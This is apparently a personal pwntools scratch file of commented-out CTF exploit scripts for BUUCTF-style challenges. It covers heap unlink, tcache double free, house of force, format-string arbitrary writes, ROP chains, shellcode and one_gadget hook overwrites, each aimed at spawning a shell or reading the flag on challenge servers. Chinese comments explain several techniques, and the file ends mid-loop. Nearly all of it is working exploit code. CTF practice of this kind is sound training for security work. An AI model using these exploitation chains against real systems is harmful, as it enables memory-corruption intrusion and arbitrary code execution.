from pwn import *

context.terminal=['tmux','splitw','-h']
# context.arch="amd64"
context.arch="i386"
# context.log_level='debug'

s = lambda data:p.send(data)
sa = lambda content,data:p.sendafter(content,data)
sl = lambda data:p.sendline(data)
sla = lambda content,data:p.sendlineafter(content,data)
ru = lambda content:p.recvuntil(content)
rl = lambda :p.recvline()
ls = lambda name,var:log.success(name+' => {}'.format(hex(var)))

#----------------------------axb_2019_heap--------------------------

# p=process('./axb_2019_heap')
# p=remote('node4.buuoj.cn',25101)
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# libc=ELF('./libc-2.23.so')

# def add(index,size,content):
#     sla('>> ',str(1))
#     sla('(0-10):',str(index))
#     sla('size:\n',str(size))
#     sla('content: \n',content)

# def delete(index):
#     sla('>> ',str(2))
#     sla('index:\n',str(index))

# def edit(index,content):
#     sla('>> ',str(4))
#     sla('index:\n',str(index))
#     sla('content: \n',content)

# payload=flat(
#     '%19$p.%15$p'
# )
# # attach(p)
# sla('name: ',payload)
# ru("Hello, ")
# main_base=int(p.recvuntil('.')[:-1],16)-0x116a
# libc_base=int(p.recvline()[:-1],16)-240-libc.sym['__libc_start_main']
# free_hook_addr=libc_base+libc.sym['__free_hook']
# system_addr=libc_base+libc.sym['system']
# ls("main_base",main_base)
# ls('libc_base',libc_base)
# ls('free_hook_addr',free_hook_addr)
# ls('system_addr',system_addr)
# note_addr=main_base+0x202060
# ls('note_addr',note_addr)
# payload=flat(
#     p64(0),p64(0x100),
#     p64(note_addr-0x18),
#     p64(note_addr-0x10),
#     'a'*(0x108-0x28),p64(0x100),
#     p8(0x10)
# )
# add(0,0x108,'aaaa')
# add(1,0x100,'bbbb')
# add(2,0x100,b'/bin/sh\x00')
# edit(0,payload)
# delete(1)
# payload=flat(
#     'a'*0x18,
#     p64(free_hook_addr),p64(0x100)
# )
# edit(0,payload)
# edit(0,p64(system_addr))
# delete(2)
# add(3,0x100,'dddd')
# delete(0)
# delete(2)
# attach(p)

#-------------------------oneshot_tjctf_2016--------------------------

# p=process('./oneshot_tjctf_2016')
# p=remote('node4.buuoj.cn',29532)
# elf=ELF('./oneshot_tjctf_2016')
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# libc=ELF('./libc-2.23.so')

# puts_got=elf.got['puts']
# ls('puts_got',puts_got)

# sl(str(puts_got))
# ru('Value: ')
# libc_base=int(rl()[:-1],16)-libc.sym['puts']
# ls('libc_base',libc_base)
# gadget=libc_base+0x45216
# sl(str(gadget))


# p.interactive()

#-------------------------------------------------------

# p=process('2018_gettingStart')
# p=remote('node4.buuoj.cn',29047)

# payload=flat(
#     'a'*0x18,
#     p64(0x7fffffffffffffff),
#     p64(0x3fb999999999999a),
# )
# sl(payload)

# p.interactive()

#---------------------------note2(solved)-----------------------------

# p=process('./note2')
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# p=remote('node4.buuoj.cn',29674)
# libc=ELF('./libc-2.23.so')

# def add(size,content):
#     sla("--->>\n",str(1))
#     sla("128)\n",str(size))
#     sla("content:\n",content)

# def show(index):
#     sla("--->>\n",str(2))
#     sla("note:\n",str(index))

# def edit(index,option,content):
#     sla("--->>\n",str(3))
#     sla("note:\n",str(index))
#     sla("append]\n",str(option))
#     sla("tents:",content)

# def delete(index):
#     sla("--->>\n",str(4))
#     sla("note:\n",str(index))

# sla('name:\n','aaaa')
# sla('address:\n','bbbb')
# fd=0x602120-0x18
# bk=0x602120-0x10
# fake_chunk=flat(
#     p64(0),p64(0x80),
#     p64(fd),p64(bk)
# )
# add(0x80,fake_chunk)
# add(0,'')
# add(0x80,'cccc')
# add(0x80,'dddd')
# payload=flat(
#     'a'*0x18,p8(0x90)
# )
# edit(1,1,payload)
# for i in range(7):
#     edit(1,1,b'a'*(0x10+7-i)+p8(0))
# edit(1,1,b'a'*0x10+p8(0x80+0x20))
# delete(2)
# payload=flat(
#     'a'*0x18,p8(0x88),p8(0x20),p8(0x60)
# )
# edit(0,1,payload)
# show(0)
# ru('Content is ')
# a2i_addr=u64(rl()[:-1].ljust(8,b'\x00'))
# ls('a2i_addr',a2i_addr)
# system_addr=a2i_addr-libc.sym['atoi']+libc.sym['system']
# ls('system_addr',system_addr)
# edit(0,1,p64(system_addr))
# sla("--->>\n",b'/bin/sh\x00')
# attach(p)
# p.interactive()

#---------------------------starctf_2019_babyshell----------------------------

# p=remote('node4.buuoj.cn',26697)
# p=process('./starctf_2019_babyshell')
# payload=flat(
#     '\x00b3',asm(shellcraft.sh())
# )
# attach(p)
# sl(payload)
# p.interactive()

#---------------------------gyctf_2020_force（hourse_of_force）---------------------------

# p=process('gyctf_2020_force')
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# p=remote('node4.buuoj.cn',28774)
# libc=ELF('./libc-2.23.so')

# def add(size,content):
#     sla('puts\n',str(1))
#     sla('size\n',str(size))
#     addr=int(str(rl()[11:-1])[2:-1],16)
#     ls('addr',addr)
#     sla('content\n',content)
#     return addr

# payload=flat('a'*0x10
#     ,p64(0)
#     ,p64(0xffffffffffffffff)
# )
#! 当使用malloc函数分配一个很大的堆块时，malloc会
#! 使用mmap来进行分配,而使用mmap分配的堆块都跟
#! libc_base有着固定的偏移，通过vmmap查看libc_base基
#! 地址，减去使用mmap分配的堆块的地址即可知道固定偏移值。
# mmap_base_addr=add(0x2000000,'aaaa')
# libc_base=mmap_base_addr+33558512
# ls('libc_base',libc_base)
# malloc_hook_addr=libc.sym['__malloc_hook']+libc_base
# realloc_addr=libc_base+libc.sym['__libc_realloc']
# realloc_hook_addr=libc_base+libc.sym['__realloc_hook']
# ls('realloc_addr',realloc_addr)
# ls('malloc_hook_addr',malloc_hook_addr)
# ls('realloc_hook_addr',realloc_hook_addr)
# pt1=add(0x10,payload)
# offset=(realloc_hook_addr-0x18)-(pt1+0x10)
# ls('pt1',pt1)
# ls('offset',offset)
# add(offset-0x10,'aaaa')
# onegadget=[0x45206,0x4525a,0xef9f4,0xf0897]
# onegadget1=[0x45216,0x4526a,0xf02a4,0xf1147]
# gadget=libc_base+onegadget1[1]
# ls('gadget',gadget)
#!将realloc_hook改为gadget,将malloc_hook改为
#!(realloc函数地址+一定的偏移量),这样在调用malloc函数时
#!,会先执行（realloc基址+一定偏移）处的汇编指令,
#!也就是push指令，然后会执行realloc函数里的realloc_hook
#!所指向的函数,也就是之前设置的gadget,而之所以要
#!先执行realloc函数,是因为realloc函数里的push会改变rsp地址，
#!使得gadget的前置条件成立。不然gadget可能无法执行。
# add(0x20,b'a'*0x8+p64(gadget)+p64(realloc_addr+0xc))
# sla('puts\n',str(1))
# attach(p)
# sla('size\n',str(0x10))
# sl('cat flag')
#!33558512=libc-2.23.so（libc基地址）- 使用mmap分配的堆的地址 
#!因为mmap分配的堆和libc基地址有一个固定的偏移

# p.interactive()

#----------------------------wustctf2020_name_your_dog---------------------------

# p=remote('node4.buuoj.cn',26792)
# p=process('./wustctf2020_name_your_dog')

# sla('>',str(-7))
# sla('plz: ',p32(0x080485CB))
# sl('cat flag')

# p.interactive()

#-----------------------------actf_2019_babyheap--------------------------

# p=process('./actf_2019_babyheap')
# elf=ELF('./actf_2019_babyheap')
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so')
# p=remote('node4.buuoj.cn',29788)
# libc=ELF('./libc-2.27.so')

# def create(size,content):
#     sla('choice: ',str(1))
#     sla('size: \n',str(size))
#     sa('content: \n',content)

# def delete(index):
#     sla('choice: ',str(2))
#     sla('ndex: \n',str(index))

# def puts(index):
#     sla('choice: ',str(3))
#     sla('ndex: \n',str(index))

# def exits():
#     sla('choice: ',str(4))

# create(0x410,'aaaa')
# create(0x410,'aaaa')
# create(0x10,'aaaa')
# delete(0)
# delete(1)
# create(0x10,p64(elf.got['malloc'])+p64(0x40098A))
# puts(0)
# ru('Content is \'')
# system_addr=u64(rl()[:-2].ljust(8,b'\x00'))-libc.sym['malloc']+libc.sym['system']
# binsh=system_addr-libc.sym['system']+0x1b3e9a
# ls("system_addr",system_addr)
# ls('got',elf.plt['malloc'])
# delete(3)
# create(0x10,p64(binsh)+p64(system_addr))
# puts(0)
# sl('cat flag')
# attach(p)

# p.interactive()

#--------------------------ciscn_final_2-----------------------------

# p=process('./ciscn_final_2')
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# p=remote('192.168.123.235',10070)
# libc=ELF('./libc-2.27.so')

# def add(type,number):
#     sla("which command?\n> ",str(1))
#     sla("TYPE:\n1: int\n2: short int\n>",str(type))
#     sla("your inode number:",str(number))

# def delete(type):
#     sla("which command?\n> ",str(2))
#     sla("TYPE:\n1: int\n2: short int\n>",str(type))

# def show(type):
#     sla("which command?\n> ",str(3))
#     sla("TYPE:\n1: int\n2: short int\n>",str(type))

# def exit():
#     sla("which command?\n> ",str(4))
# #!步骤：首先通过tcache dup（double free）
# #!使释放块的next指针指向自己（若没有double free，则next指针指向0
# #!，即无法通过show函数获取任何堆上地址），然后通过show函数获取
# #!堆上地址，最后通过add函数将本堆块next指针修改为初始0x30大小的堆块
# #!然后在通过add函数将0x30堆块的大小改为0x91，不符合fastbin就行。
# #!此时再将此0x90大小堆块free 7次，将0x90大小的tcachebin沾满，然后
# #!再次free就会将此块放入unsorted bin中，利用show函数即可leak arena地址
# #!然后可以获取stdio_filno的地址（_IO_2_1_stdin_+0x70），再通过之前
# #!的double free来进行目的地址申请即可获取stdio_filno地址的读写权
# #!最后通过将stdin的默认文件描述符0改为666即可通过exit函数中scanf函数读取flag

# #!leak堆末两字节地址，double free强行合并多个堆块为一个0x90大小的堆块
# add(1,123)
# delete(1)
# for i in range(4):
#     add(2,0x20)
# delete(2)
# add(1,0x10)
# delete(2)
# show(2)
# ru("number :")
# num=int(str(rl()[:-1])[2:-1])
# ls("num",num)
# if(num<0):
#     num=(0xffff-(-1*num-1))
# ls("low_2_bytes",num)
# add(2,num-0xa0)
# add(2,0)
# delete(1)
# add(2,0x91)
# #!反复free填满0x90大小的tcachebin，再次free进入unsortedbin，leak arena低四字节
# #!通过跟上面相同的方法，现获取stdin_filno地址，在获取其读写权，然后改0为666
# for i in range(7):
#     delete(1)
#     add(2,0)
# delete(1)
# show(1)
# ru("number :")
# num=int(str(rl()[:-1])[2:-1])
# ls("num",num)
# if num<0:
#     # num=(0xffffffff-(-1*num-1))
#     num=0x100000000+num
# ls("low_4_bytes",num)
# ls("malloc_hook_low_4_bytes",num-0x70)
# # ls("asd2",(num&0xfffff000)+(libc.sym['__malloc_hook']&0xfff))
# ls("libc_base_low_4_bytes",num-0x70-libc.sym["__malloc_hook"])
# ls("stdin_filno_low_4_bytes",num-0x70-libc.sym["__malloc_hook"]+libc.sym["_IO_2_1_stdin_"]+0x70)
# stdin_filno=num-0x70-libc.sym["__malloc_hook"]+libc.sym["_IO_2_1_stdin_"]+0x70
# add(2,stdin_filno)
# add(1,0)
# add(1,666)
# exit()

# # attach(p)

# p.interactive()

#------------------------------------------------------------

# p=process('ciscn_2019_en_3')
# libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# p=remote('node4.buuoj.cn',25524)
# libc=ELF('./libc-2.27.so')

# def add(size,content):
#     sla('choice:',str(1))
#     sla('story: \n',str(size))
#     sla('story: \n',content)

# def delete(index):
#     sla('choice:',str(4))
#     sla("index:\n",str(index))
#!double free真谛:避免在add(唯一可修改块内容的方法)的时候，已释放块完全被申请回来（意思就是避免已释放块完全退出链表）
# sl('p')
# sl('pppppppp')
# ru("pppppppp")
# setbuf_addr=u64(ru(b"\x7f").ljust(8,b'\x00'))-231
# ls("setbuf_addr",setbuf_addr)
# libc_base=setbuf_addr-libc.sym['setbuffer']
# ls("libc_base",libc_base)
# system_addr=libc_base+libc.sym['system']
# ls("system_addr",system_addr)
# free_hook=libc_base+libc.sym['__free_hook']
# add(0x10,'aaaa')
# add(0x20,'/bin/sh\x00')
# delete(0)
# delete(0)
# add(0x10,p64(free_hook))
# add(0x10,'aaaa')
# add(0x10,p64(system_addr))
# delete(1)
# sl("cat flag")
# attach(p)

# p.interactive()

#-------------------------PicoCTF_2018_are_you_root-----------------------------

# # p=process('./PicoCTF_2018_are_you_root')
# p=remote('node4.buuoj.cn',29159)

# show = lambda :sla('> ',b'show')
# login = lambda name:sla("> ",b'login '+name)
# setauth = lambda level:sla('> ',bytes('set-auth '+str(level),encoding='utf8'))
# getflag = lambda :sla('> ',b'get-flag')
# reset = lambda :sla('> ',b'reset')

# login(b'a'*0x8+p64(5))
# reset()
# login(b"we will get flag")
# getflag()



# p.interactive()

#-------------------------judgement_mna_2016-------------------

#!用glibc2.23环境调试一下，可以在栈上找到flag地址
#!然后直接%num$s打印即可
# # p=process('./judgement_mna_2016')
# p=remote('node4.buuoj.cn',27373)

# # attach(p)
# payload=b'aaaa%32$s'
# sla('>> ',payload)

# p.interactive()

#-----------------------------hgame week2 formatstr(hard)----------------------------------
# p=process('./vuln')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
# pop_rdi = 0x0000000000401783
# ret_addr = 0x000000000040101a
#!通过gdb调试可以看到栈空间里存在stderr等共享库(libc.so.6)内的变量，泄露之后可得libc_base
# p.sendafter('say?\n',b'a'*0x98)
# std_error=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
# libc_base=std_error-libc.sym._IO_2_1_stderr_
# system_addr=libc_base+libc.sym.system
# binsh_addr=libc_base+next(libc.search(b'/bin/sh'))
# p.sendlineafter('(Y/n)\n',b'y')
#!跟第一部一样，还是从栈空间上去找可利用地址，通过gdb调试可以得到rbp-0x10处为一个stack地址
# p.send(b'a'*0x100)
# stack_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# ls('stack_addr',stack_addr)
#!非常精巧的一步，大体可以如此理解：
#!首先将栈上存储vuln的返回地址的地址（本题为stack_addr-0x8）分解为4个两字节大小的空间，然后通过
#!read写入到栈上。之后的步骤依旧如此，但是要注意栈地址与gadget的相互对应。
#!构造完毕后，栈上buf变量应如此：
#!stack_main_addr+0x00,stack_main_addr+0x02,stack_main_addr+0x04 (用来存储pop_rdi地址)
#!stack_main_addr+0x10,stack_main_addr+0x12,stack_main_addr+0x14 (用来存储ret地址)
#!stack_main_addr+0x08,stack_main_addr+0x0a,stack_main_addr+0x0c,stack_main_addr+0x0e (用来存储/bin/sh字符串)
#!stack_main_addr+0x18,stack_main_addr+0x1a,stack_main_addr+0x1c,stack_main_addr+0x1e (用来存储system函数地址)
# rop_addr=stack_addr-0x8
# rop_rdi = rop_addr
# payload = p64(rop_rdi)
# rop_rdi += 2
# payload += p64(rop_rdi)
# rop_rdi += 2
# payload += p64(rop_rdi)
# # write ret
# rop_ret = rop_addr + 0x10
# payload += p64(rop_ret)
# rop_ret += 2
# payload += p64(rop_ret)
# rop_ret += 2
# payload += p64(rop_ret)
# # write /bin/sh
# rop_binsh = rop_addr + 0x08
# payload += p64(rop_binsh)
# rop_binsh += 2
# payload += p64(rop_binsh)
# rop_binsh += 2
# payload += p64(rop_binsh)
# rop_binsh += 2
# payload += p64(rop_binsh)
# # write system
# rop_system = rop_addr + 0x18
# payload += p64(rop_system)
# rop_system += 2
# payload += p64(rop_system)
# rop_system += 2
# payload += p64(rop_system)
# rop_system += 2
# payload += p64(rop_system)
# p.sendlineafter(b"(Y/n)\n",b'Y')
# p.send(payload)
#!次函数作用为保持打印的字符数量始终为0x10000的整数倍，以防止前一次的地址变量修改所使用的的字符数量对下一次地址变量修改造成影响。
# def splitaddr(target_addr):
#     addr = []
#     curr = 0
#     for _ in range(4):
#         num = target_addr % 65536
#         tmp = (num - curr + 65536) % 65536
#         addr.append(tmp)
#         curr = (curr + tmp) % 65536
#         target_addr = target_addr >> 16
#     return addr
#!利用刚刚在buf（栈上变量）上写入的栈地址（实际上是存储main函数偏移地址的地址），通过格式化字符串分步将之修改，以构造rop链。
# nums=splitaddr(pop_rdi)
# payload=b'%'+bytes(str(nums[0]),'utf8')+b'lx%8$hn'
# payload+=b'%'+bytes(str(nums[1]),'utf8')+b'lx%9$hn'
# payload+=b'%'+bytes(str(nums[2]),'utf8')+b'lx%10$hn'
# nums=splitaddr(ret_addr)
# payload+=b'%'+bytes(str(nums[0]),'utf8')+b'lx%11$hn'
# payload+=b'%'+bytes(str(nums[1]),'utf8')+b'lx%12$hn'
# payload+=b'%'+bytes(str(nums[2]),'utf8')+b'lx%13$hn'
# nums=splitaddr(binsh_addr)
# payload+=b'%'+bytes(str(nums[0]),'utf8')+b'lx%14$hn'
# payload+=b'%'+bytes(str(nums[1]),'utf8')+b'lx%15$hn'
# payload+=b'%'+bytes(str(nums[2]),'utf8')+b'lx%16$hn'
# payload+=b'%'+bytes(str(nums[3]),'utf8')+b'lx%17$hn'
# nums=splitaddr(system_addr)
# payload+=b'%'+bytes(str(nums[0]),'utf8')+b'lx%18$hn'
# payload+=b'%'+bytes(str(nums[1]),'utf8')+b'lx%19$hn'
# payload+=b'%'+bytes(str(nums[2]),'utf8')+b'lx%20$hn'
# payload+=b'%'+bytes(str(nums[3]),'utf8')+b'lx%21$hn'
# print(hex(len(payload)))
# p.sendlineafter(b"(Y/n)\n",b'n')
# attach(p)
# p.send(payload+b'\x00')

# p.interactive()
#!总结：利用手法十分巧妙，值得深思学习。（反正我不会）

#-------------------------gyctf_2020_signin-------------------------------

# p=process('./gyctf_2020_signin')
# # p=remote('node4.buuoj.cn',28043)
# def add(idx):
#     sa('choice?',b'1')
#     sa('idx?\n',str(idx))
# def edit(idx,content):
#     p.sendafter('choice?',b'2')
#     p.sendafter('idx?\n',str(idx))
#     sleep(1)
#     p.send(content)
# def delete(idx):
#     p.sendafter('choice?',b'3')
#     p.sendafter('idx?\n',str(idx))
# def backdoor():
#     p.sendafter('choice?',b'6')
#!本题利用的是calloc的特性，即申请fast大小的块时，
#!即使tcachebin有合适的块，也不会从tcachebin里获取，
#!而是从fastbin里查询对应的块，若果没有则从top堆获取
#!将tcachebin填满，并将一个fast块放入fastbin
# for i in range(8):
#     add(i)
# for i in range(8):
#     delete(i)
#!利用uaf将fast chunk的fd指针改为bss段的ptr地址-0x10
#!之所以要减去0x10，是因为此块在fastbin而不在tcachebin上，
#!fastbin的fd指针指向堆块开头，
#!而tcachebin的next指针指向堆块内容的开头
# edit(7,p64(0x4040C0-0x10))
#!将tcachebin中的块拿出来一些
# add(8)
# add(9)
#!执行calloc，将fastbin中正常的块取出来，
#!然后将其后的bss段上的块放入tcache，
#!这样bss段的块的next指针就会被更改为链表上的下一个块的地址，
#!即更改ptr不为0
# backdoor()
# p.interactive()

#--------------------------xman_2019_format-------------------------------

# for i in range(16):
    # try:
        # p=process('./xman_2019_format')
        # p=remote('node4.buuoj.cn',27438)
        #!猜的第一个ebp的最后一位，所以成功的可能只有1/16
        # guess=0x58
        #!利用栈帧的嵌套，更改ebp，因为ebp距ret最近而且有嵌套，
        #!首先使用第一个ebp去改第二个ebp下存的ebp也就是第三个ebp，
        #!改成最后一个字节+0x4，即ret地址，
        #!然后再利用第二个ebp去改第三个ebp下的ret地址，
        #!改后两位为backdoor的地址即可getshell
        # payload=flat(
        #     '%'+str(guess+0x20+0x4)+'c%10$hhn|%'+str(0x85AB)+'c%18$hn'
        # )
        # p.recvuntil('...\n...\n')
        #!调试时启用，附加进程后，会自动执行gdbscript，
        #!判断ebp是不是0x58结尾，不是则退出
        # attach(p,gdbscript='''
        # b *0x80485f6
        # c
        # if (unsigned int)$ebp&0xff^0x58
        #     quit
        # end
        # ''')
    #     p.sendline(payload)
    #     p.interactive()
    # except :
    #     print('no')
    # sleep(1)

#-------------------------wdb_2018_3rd_soEasy------------------------------

# # p=process('wdb_2018_3rd_soEasy')
# p=remote('node4.buuoj.cn',28546)

# payload=asm(shellcraft.sh())
# stack_addr=int(str(p.recvline())[-13:-3],16)
# ls('stack_addr',stack_addr)
# payload+=b'a'*(72-len(payload))+p32(0)+p32(stack_addr)

# p.sendlineafter(b'do?\n',payload)

# p.interactive()

#-------------------------bjdctf_2020_YDSneedGrirlfriend------------------------------

# p=process('./bjdctf_2020_YDSneedGrirlfriend')
# p=remote('node4.buuoj.cn',25304)
# def add(size,name):
#     sa('choice :',str(1).encode())
#     sa('size is :',str(size).encode())
#     if type(name)=='str'.__class__:
#         sa('name is :',name.encode())
#         return
#     sa('name is :',name)
# def delete(index):
#     sa('choice :',str(2).encode())
#     sa('Index :',str(index).encode())
# def show(index):
#     sa('choice :',str(3).encode())
#     sa('Index :',str(index).encode())
# backdoor=0x400B9C
#!简单的覆盖堆块开头print函数为backdoor地址即可
# add(0x20,'asd')
# add(0x20,'asd')
# delete(0)
# delete(1)
# add(0x10,p64(backdoor))
# show(0)
# p.interactive()

#-------------------------pwn200---------------------

# p=process('pwn200')



# p.interactive()

#------------------------studentmanager-----------------

# # p=process('./StudentManager')
# p=remote('39.102.55.191',9998)
# libc=ELF('./libc-2.31.so')
# # libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

# def add(name,size,des):
#     sla('>> ',str(1).encode())
#     sa('Name: \n',name.encode()\
#         if type(name)=='str'.__class__\
#         else name)
#     sla('Size: \n',str(size).encode())
#     sa('Description: \n',des.encode()\
#         if type(des)=='str'.__class__\
#         else des)

# def edit(idx,name,des):
#     sla('>> ',str(2).encode())
#     sla('edit: \n',str(idx).encode())
#     sa('Name: \n',name.encode()\
#         if type(name)=='str'.__class__\
#         else name)
#     sa('description: \n',des.encode()\
#         if type(des)=='str'.__class__\
#         else des)

# def show(idx):
#     sla('>> ',str(3).encode())
#     sla('show: \n',str(idx).encode())

# add('asd',-800+0x17,'asd')
# edit(0,'a'*0x10,'bbbb')
# show(0)
# p.recvline()
# p.recvline()
# bss_addr=u64(p.recvline()[-7:-1].ljust(8,b'\x00'))
# ls('bss_addr',bss_addr)
# add('asd',0x9,'a')
# show(1)
# p.recvline()
# p.recvline()
# p.recvline()
# p.recvline()
# puts_off_addr=u64(p.recvline()[1:-1].ljust(8,b'\x00'))
# ls('puts_off_addr',puts_off_addr)
# libc_off_base=puts_off_addr-libc.sym.puts
# ls('libc_off_base',libc_off_base)
# gadgets=[0xe3b2e,0xe3b31,0xe3b34]
# gadget=libc_off_base+gadgets[0]
# add('asd',0x28,'a')
# add('asd',0x10,p64(gadget))

# p.interactive()

#-------------------------pwn200-----------------------------

# # p=process('./pwn200')
# elf=ELF('./pwn200')
# p=remote('node4.buuoj.cn',25554)

# p.sendafter('u?\n',b'a'*48)
# p.recvuntil(b'a'*48)
# stack_addr=u64(p.recv(6).ljust(8,b'\x00'))
# print(hex(stack_addr))
# p.sendlineafter('~~?\n',b'1')
# pop_rdi=0x400bc3
# vuln_addr=0x400A8E
# puts_plt=elf.plt['puts']
# # payload=flat(
# #     p64(pop_rdi),p64(stack_addr+8),p64(puts_plt),
# #     p64(vuln_addr)
# # )
# # payload+=b'a'*(56-len(payload))+p64(stack_addr+0x8)
# payload=p64(stack_addr-184)+asm(shellcraft.sh())+p64(elf.got['free'])
# # attach(p)
# p.sendlineafter('money~\n',payload)

# p.interactive()

#-------------------------ciscn_2019_sw_1-----------------------------

# p=process('./ciscn_2019_sw_1')
# p=remote('node4.buuoj.cn',25418)
# elf=ELF('./ciscn_2019_sw_1')
# fini_addr=0x0804979C
# main_addr=0x08048534
# printf_got=elf.got['printf']
# system_plt=0x80483d0
# payload=b"%2052c%13$hn%31692c%14$hn%356c%15$hn"+p32(printf_got+2)+p32(printf_got)+p32(fini_addr)
# p.sendlineafter('name?\n',payload)
# p.interactive()

#---------------------------suctf-2018-stack----------

# p=process('./SUCTF_2018_stack')
# p=remote('node4.buuoj.cn',27814)

# payload=b'a'*(32+8)+p64(0x40067A)
# # attach(p)
# p.sendlineafter("==\n",payload)

# p.interactive()

#---------------------------------HITCON_2018_children_tcache-------
#!有点没搞懂这题,感觉利用有点巧妙
#!漏洞是off-by-null:由strcpy函数造成,strcpy函数遇\x00截止，但是还是会把x\00一同复制进目标地址
#!题目用到了unlink，但因为随机地址开着，所以没办法像寻常unlink一样控制ptr_list,而是进行覆盖(overlaping)
#!利用unsorted bin来leak main_arena偏移地址，然后利用tcache double free来进行任一地址申请,最后
#!覆盖free_hook为onegadget成功getshell
#!感觉跟之前的堆题都不太一样，但是又不知道哪里不一样，很难受
# # p=process('./HITCON_2018_children_tcache')
# p=remote('node4.buuoj.cn',25246)
# elf=ELF('./HITCON_2018_children_tcache')
# # libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# libc=ELF('./libc-2.27.so')

# def create(size,content):
#     sla("Your choice: ",str(1).encode())
#     sla("Size:",str(size).encode())
#     sla("Data:",content)

# def show(index):
#     sla("Your choice: ",str(2).encode())
#     sla("Index:",str(index).encode())

# def delete(index):
#     sla("Your choice: ",str(3).encode())
#     sla("Index:",str(index).encode())

# create(0x410,'a')
# create(0xe8,'a')
# create(0x4f0,'a')
# create(0x410,'a')
# delete(0)
# delete(1)
# for i in range(0,6):
#     create(0xe8-i,'a'*(0xe8-i))
#     delete(0)
# create(0xe2,b'a'*0xe0+p16(0x510))
# delete(2)
# create(0x410,'a')
# show(0)

# addr=u64(p.recvline()[:-1].ljust(8,b'\x00'))
# ls('addr',addr)
# malloc_hook=addr-96-0x10
# ls('malloc_hook',malloc_hook)
# base=malloc_hook-libc.sym['__malloc_hook']
# ls('base',base)
# free_hook=base+libc.sym['__free_hook']
# ls('free_hook',free_hook)
# gadgets=[0x4f2c5,0x4f322,0x10a38c]
# gadget=base+gadgets[1]
# create(0x60,'a')
# delete(0)
# delete(2)
# create(0x60,p64(free_hook))
# create(0x60,p64(free_hook))
# create(0x60,p64(gadget))
# # attach(p)
# delete(3)
# p.interactive()

#------------------------gyctf_2020_some_thing_interesting

# def check():
#     p.sendlineafter('to do :',str(0))
# def create(olength,oc,relength,rec):
#     sla('to do :',str(1))
#     sla('length : ',str(olength).encode())
#     sla('O : ',oc)
#     sla('length : ',str(relength).encode())
#     sla('RE : ',rec)
# def modify(idx,oc,rec):
#     sla('to do :',str(2))
#     sla('ID : ',str(idx))
#     sla('O : ',oc)
#     sla('RE : ',rec)
# def delete(idx):
#     sla('to do :',str(3))
#     sla('ID : ',str(idx))
# def view(idx):
#     sla('to do :',str(3))
#     sla('ID : ',str(idx))

# # p=process('./gyctf_2020_some_thing_interesting')
# p=remote('node4.buuoj.cn',26483)
# # libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# libc=ELF('./libc-2.23.so')
# p.sendline('OreOOrereOOreO%17$p')

# check()
# p.recvline()
# addr=int(str(p.recvline())[-17:-3],16)
# ls('addr',addr)
# base=addr-libc.sym['__libc_start_main']-240
# ls('base',base)
# malloc_hook=base+libc.sym['__malloc_hook']
# ls('malloc_hook',malloc_hook)
# free_hook=libc.sym['__free_hook']+base
# ls('free_hook',free_hook)
# realloc_addr=base+libc.sym['__libc_realloc']
# ls("realloc_addr",realloc_addr)
# # gadgets=[0x45206,0x4525a,0xef9f4,0xf0897]
# gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
# gadget=base+gadgets[3]
# ls('gadget',gadget)
# create(0x60,'a',0x20,'a')
# delete(1)
# modify(1,p64(malloc_hook-0x23),'a')
# create(0x60,'a',0x60,'a')
# modify(2,'a',b'a'*(0x13)+p64(gadget))
# sla('to do :',str(1))
# sla('length : ','10')
# p.interactive()

#-------------------------stack2-----------------------------

#!main函数栈帧混乱，混淆main函数返回地址

# p=process('./stack2')
# p=remote('node4.buuoj.cn',27410)

# sla('have:\n',str(3))
# sla('numbers\n','1\n2\n3')
# sla('exit\n',str(3))
# sla('change:\n',str(0x84))
# # attach(p)
# sla('number:\n',str(0x9B))
# sla('exit\n',str(3))
# sla('change:\n',str(0x85))
# # attach(p)
# sla('number:\n',str(0x85))
# sla('exit\n',str(3))
# sla('change:\n',str(0x86))
# # attach(p)
# sla('number:\n',str(0x4))
# sla('exit\n',str(3))
# sla('change:\n',str(0x87))
# sla('number:\n',str(0x8))
# # attach(p)
# sla('exit\n',str(5))
# p.interactive()

#--------------------------shell----------------------
# #!经典bss段格式化字符串
# import pdb
# # p=process('./shell')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

# p=remote('192.168.123.235',9999)
# # libc=ELF('./libc-2.31.so')

# def lsq():
#     p.sendlineafter(b'> ', b'ls')

# def cat():
#     p.sendlineafter(b'> ', b'cat')

# def echo(content):
#     p.sendlineafter(b'> ', b'echo ' + content)

# def quit():
#     p.sendlineafter(b'> ', b'exit')
# echo(b'%6$p%7$p%11$p%19$p')
# cat()
# libc_base=int(str(p.recv(14))[2:-1],16)-0x216600
# heap_addr=int(str(p.recv(14))[2:-1],16)
# elf_addr=int(str(p.recv(14))[2:-1],16)-0x141b
# stack_addr=int(str(p.recv(14))[2:-1],16)
# pop_rdi=elf_addr+0x1493
# binsh=libc_base+0x1d8698
# system_addr=libc_base+libc.sym.system
# ret_addr=elf_addr+0x1494
# ls('libc_base',libc_base)
# ls('heap_addr',heap_addr)
# ls('elf_addr',elf_addr)
# ls('stack_addr',stack_addr)
# ls('pop_rdi',pop_rdi)
# #!修改ret[0]内容为pop_rdi
# main_ret=(stack_addr&0xffff)-0x110
# for i in range(6):
#     if i==0:
#         payload=b'%'+str(main_ret+i).encode()+b'c%19$hn'
#     else:
